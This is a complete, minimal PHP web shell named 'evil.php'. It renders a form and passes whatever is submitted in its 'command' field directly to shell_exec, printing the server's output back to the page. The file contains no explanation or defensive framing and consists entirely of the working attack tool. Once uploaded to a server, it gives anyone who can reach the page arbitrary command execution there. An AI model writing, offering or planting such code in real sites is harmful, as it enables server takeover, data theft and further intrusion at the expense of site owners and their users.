<?php
if (isset($_POST['command'])){
echo "<form action='evil.php' method='post'>
      <input type='text' name='command' value=''/>
      <input type='submit' value='execute'/>
      </form>";
 
    if(function_exists('shell_exec')) {
    $command=$_POST['command'];
    $output = shell_exec("$command");
    echo "<pre>$output</pre>";
   }
}
else {
  echo "<form action='evil.php' method='post'>
      <input type='text' name='command' value=''/>
      <input type='submit' value='execute'/>
      </form>";
}
?>
